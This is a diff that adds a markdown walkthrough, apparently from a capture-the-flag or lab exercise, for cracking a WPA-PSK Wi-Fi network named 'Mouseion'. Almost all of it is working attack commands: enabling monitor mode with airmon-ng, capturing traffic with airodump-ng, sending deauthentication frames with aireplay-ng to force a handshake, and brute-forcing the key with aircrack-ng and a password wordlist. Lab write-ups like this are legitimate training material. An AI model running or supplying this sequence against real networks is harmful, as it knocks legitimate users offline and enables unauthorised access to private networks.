@@ -1,0 +1,63 @@
+ Open terminal and elevate to root
+```
+┌──(kali㉿kali)-[~/Downloads]
+└─$ sudo su
+```
+- Show available network interfaces
+```
+┌──(rootalexandria)-[/home/kali]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.10.10.10  netmask 255.255.255.0  broadcast 10.10.10.255
+        ether 02:42:0a:0a:0a:0a  txqueuelen 0  (Ethernet)
+        RX packets 8010  bytes 576950 (563.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 8302  bytes 15238331 (14.5 MiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 13  bytes 793 (793.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 13  bytes 793 (793.0 B)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+```
+- Wlan doesn't show up, but try starting airmon-ng on interface wlan0
+```
+┌──(rootalexandria)-[/home/kali]
+└─# airmon-ng start wlan0
+```
+
+- Now start airodump-ng
+```
+┌──(rootalexandria)-[/home/kali]
+└─# airodump-ng wlan0mon
+```
+
+- "Mouseion" network AP shows up on channel 4 with WPA-PSK (BSSID 02:13:37:BE:EF:03)
+- Stop airodump with CTRL+C and start again on channel 4 and write to ouput file "PSK"
+```
+┌──(rootalexandria)-[/home/kali]
+└─# airodump-ng wlan0mon -c 4 -w PSK
+```
+
+- If no stations connected. Open new terminal tab and attempt to deauth the AP and see if any reconnect
+```
+┌──(rootalexandria)-[/home/kali]
+└─# aireplay-ng -0 10 -a 02:13:37:BE:EF:03 wlan0mon
+```
+
+- Back in airodump-ng tab, observe a station connects and handshake is captured
+
+- Stop airodump-ng with CTRL+C
+- Ensure output files were written
+```
+┌──(rootalexandria)-[/home/kali]                                           
+└─# ls
+```
+
+- Attempt to crack with aircrack-ng
+```
+┌──(rootalexandria)-[/home/kali]
+└─# aircrack-ng PSK-01.cap -w /usr/share/wordlists/seclists/Passwords/probable-v2-top12000.txt
